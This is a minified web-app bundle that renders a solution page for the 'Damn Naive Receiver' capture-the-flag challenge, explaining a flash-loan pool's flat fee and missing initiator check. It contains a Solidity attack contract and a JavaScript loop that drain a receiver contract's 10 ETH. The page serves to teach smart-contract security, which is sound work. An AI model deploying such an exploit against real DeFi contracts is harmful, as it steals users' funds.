/*! For license information please see 88.d871f1d7.chunk.js.LICENSE.txt */
"use strict";(self.webpackChunkclient=self.webpackChunkclient||[]).push([[88],{73:(e,s,l)=>{l.d(s,{A:()=>a});const a=(0,l(7784).A)("Zap",[["path",{d:"M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z",key:"1xq2db"}]])},2088:(e,s,l)=>{l.r(s),l.d(s,{default:()=>p});l(5043);var a=l(457),i=l(8628),n=l(5727),c=l(7719),r=l(2382),t=l(3165),d=l(8729),o=l(73),h=l(2105),x=l(579);const p=()=>(0,x.jsxs)("div",{className:"mb-4",children:[(0,x.jsxs)("h3",{className:"d-flex align-items-center gap-2 mb-3",children:[(0,x.jsx)(n.A,{size:20,className:"text-muted"}),"Damn Naive Receiver CTF Challenge"]}),(0,x.jsx)(a.A,{defaultActiveKey:"0",children:(0,x.jsxs)(i.A,{children:[(0,x.jsxs)(a.A.Header,{as:i.A.Header,className:"d-flex justify-content-between align-items-center",children:[(0,x.jsxs)("div",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(c.A,{size:18,className:"text-warning"}),(0,x.jsx)("strong",{children:"View Challenge Solution"})]}),(0,x.jsx)(r.A,{size:18})]}),(0,x.jsx)(a.A.Body,{children:(0,x.jsxs)(i.A.Body,{children:[(0,x.jsxs)("div",{className:"mb-4",children:[(0,x.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(t.A,{size:18}),"Challenge Goal"]}),(0,x.jsx)("p",{children:"Drain all 10 ETH from a receiver contract (which interacts with a lending pool), without being its owner."})]}),(0,x.jsxs)("div",{className:"mb-4",children:[(0,x.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(d.A,{size:18}),"Contract Setup"]}),(0,x.jsx)("h6",{children:"\ud83c\udfe6 Naive Lending Pool Contract"}),(0,x.jsxs)("ul",{children:[(0,x.jsx)("li",{children:"Holds 1000 ETH"}),(0,x.jsx)("li",{children:"Offers flash loans"}),(0,x.jsx)("li",{children:"Charges a flat fee of 1 ETH per loan"})]}),(0,x.jsx)("pre",{className:"bg-light p-2 rounded",children:'require(\n    address(this).balance >= balanceBefore + FIXED_FEE,\n    "Flash loan hasn\'t been paid back"\n);'}),(0,x.jsx)("h6",{className:"mt-3",children:"\ud83d\udc64 Receiver Contract"}),(0,x.jsxs)("ul",{children:[(0,x.jsx)("li",{children:"Has 10 ETH balance"}),(0,x.jsx)("li",{children:"Automatically repays loan + fee"}),(0,x.jsx)("li",{children:"Doesn't validate loan initiator"})]})]}),(0,x.jsxs)("div",{className:"mb-4",children:[(0,x.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(c.A,{size:18,className:"text-danger"}),"Core Vulnerabilities"]}),(0,x.jsx)("h6",{children:"\ud83d\udcc9 1. Flat Fee Model"}),(0,x.jsx)("p",{children:"Every flash loan costs 1 ETH, even for 0 ETH loans"}),(0,x.jsx)("h6",{className:"mt-3",children:"\ud83e\udde8 2. No Authorization"}),(0,x.jsx)("p",{children:"Anyone can initiate flash loans on behalf of the receiver"})]}),(0,x.jsxs)("div",{className:"mb-4",children:[(0,x.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(o.A,{size:18,className:"text-primary"}),"Exploit Strategy"]}),(0,x.jsx)("p",{children:"Call flash loan 10 times with 0 ETH amount:"}),(0,x.jsx)("pre",{className:"bg-light p-2 rounded",children:"naivePool.flashLoan(address(receiver), 0);"}),(0,x.jsx)("p",{children:"Each call triggers:"}),(0,x.jsx)("pre",{className:"bg-light p-2 rounded",children:"function receiveEther(uint256 fee) external payable {\n    uint256 amountToBeRepaid = msg.value + fee;\n    require(msg.sender == pool);\n    pool.sendEtherBack{value: amountToBeRepaid}();\n}"}),(0,x.jsxs)("ul",{children:[(0,x.jsx)("li",{children:"msg.value = 0, fee = 1 ETH"}),(0,x.jsx)("li",{children:"Receiver sends 1 ETH back to pool"}),(0,x.jsx)("li",{children:"Repeat 10 times to drain all ETH"})]})]}),(0,x.jsxs)("div",{children:[(0,x.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(h.A,{size:18}),"Exploit Contract"]}),(0,x.jsx)("pre",{className:"bg-light p-3 rounded",children:"contract AttackNaiveReceiver {\n    NaiveReceiverLenderPool public pool;\n    address public victim;\n\n    constructor(address _pool, address _victim) {\n        pool = NaiveReceiverLenderPool(_pool);\n        victim = _victim;\n    }\n\n    function attack() external {\n        for (uint8 i = 0; i < 10; i++) {\n            pool.flashLoan(victim, 0); // Drain 1 ETH per call\n        }\n    }\n}"}),(0,x.jsx)("p",{className:"mt-2",children:"Test script alternative:"}),(0,x.jsx)("pre",{className:"bg-light p-2 rounded",children:"for (let i = 0; i < 10; i++) {\n  await pool.flashLoan(receiver.address, 0);\n}"})]})]})})]})})]})},2105:(e,s,l)=>{l.d(s,{A:()=>a});const a=(0,l(7784).A)("Code",[["polyline",{points:"16 18 22 12 16 6",key:"z7tu5w"}],["polyline",{points:"8 6 2 12 8 18",key:"1eg1df"}]])},2382:(e,s,l)=>{l.d(s,{A:()=>a});const a=(0,l(7784).A)("ChevronDown",[["path",{d:"m6 9 6 6 6-6",key:"qrunsl"}]])},3165:(e,s,l)=>{l.d(s,{A:()=>a});const a=(0,l(7784).A)("Target",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["circle",{cx:"12",cy:"12",r:"6",key:"1vlfrh"}],["circle",{cx:"12",cy:"12",r:"2",key:"1c9p78"}]])},5727:(e,s,l)=>{l.d(s,{A:()=>a});const a=(0,l(7784).A)("Lock",[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 10 0v4",key:"fwvmzm"}]])},8729:(e,s,l)=>{l.d(s,{A:()=>a});const a=(0,l(7784).A)("BookText",[["path",{d:"M4 19.5v-15A2.5 2.5 0 0 1 6.5 2H19a1 1 0 0 1 1 1v18a1 1 0 0 1-1 1H6.5a1 1 0 0 1 0-5H20",key:"k3hazp"}],["path",{d:"M8 11h8",key:"vwpz6n"}],["path",{d:"M8 7h6",key:"1f0q6e"}]])}}]);
//# sourceMappingURL=88.d871f1d7.chunk.js.map